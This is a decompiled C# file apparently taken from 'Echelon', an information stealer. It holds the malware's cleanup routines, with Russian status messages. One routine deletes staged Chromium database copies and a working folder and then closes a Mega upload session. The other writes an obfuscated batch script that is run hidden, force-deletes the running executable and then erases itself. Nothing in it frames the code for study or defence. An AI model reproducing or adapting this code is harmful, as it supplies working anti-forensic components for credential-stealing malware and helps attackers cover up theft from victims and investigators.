﻿using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using ChromV1;

namespace Echelon.Global
{
	// Token: 0x02000054 RID: 84
	internal class Clean
	{
		// Token: 0x060001F6 RID: 502 RVA: 0x000219EC File Offset: 0x0001FBEC
		public static void GetClean()
		{
			try
			{
				Console.WriteLine("Очистка рабочей папки");
				if (Directory.Exists(Help.dir))
				{
					Directory.Delete(Help.dir + "\\", true);
				}
				if (File.Exists(Chromium.bd))
				{
					File.Delete(Chromium.bd);
				}
				if (File.Exists(Chromium.ls))
				{
					File.Delete(Chromium.ls);
				}
				MegaSend.MegaQuit();
			}
			catch
			{
			}
		}

		// Token: 0x060001F7 RID: 503 RVA: 0x00021A6C File Offset: 0x0001FC6C
		public static void selfRemove()
		{
			if (Program.selfDelete)
			{
				Console.WriteLine("Самоудаление");
				string text = Path.GetTempFileName() + Decrypt.Get("H4sIAAAAAAAEANNLzk0BAMPCtLEEAAAA");
				using (StreamWriter streamWriter = new StreamWriter(text))
				{
					streamWriter.WriteLine(Decrypt.Get("H4sIAAAAAAAEAFNySE3OyFfIT0sDAP8G798KAAAA"));
					streamWriter.WriteLine(Decrypt.Get("H4sIAAAAAAAEACvJzE3NLy1RMFGwU/AL9QEAGpgiIA8AAAA="));
					streamWriter.WriteLine(Decrypt.Get("H4sIAAAAAAAEAHNx9VEAAJx/wSQEAAAA") + "\"" + Path.GetFileName(new FileInfo(new Uri(Assembly.GetExecutingAssembly().CodeBase).LocalPath).Name) + "\" /f /q");
					streamWriter.WriteLine(Decrypt.Get("H4sIAAAAAAAEAHN2UQAAQkDmIgMAAAA=") + Path.GetTempPath());
					streamWriter.WriteLine(Decrypt.Get("H4sIAAAAAAAEAHNx9VEAAJx/wSQEAAAA") + "\"" + text + "\" /f /q");
				}
				Process.Start(new ProcessStartInfo
				{
					FileName = text,
					CreateNoWindow = true,
					ErrorDialog = false,
					UseShellExecute = false,
					WindowStyle = ProcessWindowStyle.Hidden
				});
			}
		}
	}
}
